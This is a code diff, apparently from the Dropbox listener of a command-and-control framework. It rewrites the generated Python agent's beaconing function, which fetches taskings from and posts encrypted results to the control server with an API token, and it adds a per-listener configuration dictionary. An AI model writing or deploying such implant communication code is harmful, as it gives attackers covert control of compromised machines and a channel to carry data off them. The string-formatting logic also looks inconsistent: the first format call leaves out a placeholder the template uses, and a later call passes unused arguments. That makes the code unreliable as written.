@@ -559,7 +559,7 @@ class Listener:
     'delay' : {delay},
     'jitter' : {jitter},
     'fixed_parameters': {{
-        'headers' : {{'User-Agent': "{UA}", 'Cookie':"{cookie}"}},
+        'headers' : {{'User-Agent': "{UA}"}},
         'taskURIs' : "{taskURIs}",
     }},
     'send_func': {send_func},
@@ -680,15 +680,18 @@ class Listener:
             elif language.lower() == 'python':
 
                 sendMessage = """
-def send_message(packets=None):
+def send_message{name}(packets=None, **kwargs):
     # Requests a tasking or posts data to a randomized tasking URI.
     # If packets == None, the agent GETs a tasking from the control server.
     # If packets != None, the agent encrypts the passed packets and
     #    POSTs the data to the control server.
 
+    headers = kwargs['headers']
+    taskURIs = kwargs['taskURIs'].split(',')
+
     def post_message(uri, data, headers):
         req = urllib2.Request(uri)
-        headers['Authorization'] = "Bearer REPLACE_API_TOKEN"
+        headers['Authorization'] = "Bearer {api_token}"
         for key, value in headers.iteritems():
             req.add_header("%s"%(key),"%s"%(value))
 
@@ -701,10 +704,8 @@ def send_message(packets=None):
 
         return urllib2.urlopen(req).read()
 
-    global missedCheckins
-    global headers
-    taskingsFolder="REPLACE_TASKSING_FOLDER"
-    resultsFolder="REPLACE_RESULTS_FOLDER"
+    taskingsFolder="{taskings_folder}"
+    resultsFolder="{results_folder}"
     data = None
     requestUri=''
     try:
@@ -752,16 +753,42 @@ def send_message(packets=None):
 
     except urllib2.URLError as URLerror:
         # if the server cannot be reached
-        missedCheckins = missedCheckins + 1
         return (URLerror.reason, '')
 
     return ('', '')
-"""
+#COMM_FUNC
+""".format(api_token = apiToken, taskings_folder = taskingsFolder, results_folder = resultsFolder)
                 
-                sendMessage = sendMessage.replace('REPLACE_TASKSING_FOLDER', taskingsFolder)
-                sendMessage = sendMessage.replace('REPLACE_RESULTS_FOLDER', resultsFolder)
-                sendMessage = sendMessage.replace('REPLACE_API_TOKEN', apiToken)
-                return sendMessage
+                listener_dict = """
+{{
+    'name': '{name}',
+    'delay' : {delay},
+    'jitter' : {jitter},
+    'fixed_parameters': {{
+        'headers' : {{'User-Agent': "{UA}"}},
+        'taskURIs' : "{taskURIs}",
+    }},
+    'send_func': {send_func},
+    'defaultResponse': "{defaultResponse}",
+    'lostLimit': {lostLimit},
+    'missedCheckins':0,
+}},
+#LISTENER_DICT
+"""
+
+                return( listener_dict.format(
+                            send_func = "send_message_{}".format(listenerOptions['Name']['Value']),
+                            delay = delay,
+                            jitter = jitter,
+                            UA = profile.split('|')[1],
+                            name = listenerOptions['Name']['Value'],
+                            taskURIs = profile.split('|')[0],
+                            lostLimit = lostLimit,
+                            defaultResponse = b64DefaultResponse),
+                        sendMessage.format(name=listenerOptions['Name']['Value'],
+                            update_servers = updateServers,
+                            https = https_attrs))
+
         else:
             print helpers.color('[!] listeners/dbx generate_comms(): no language specified!')
 
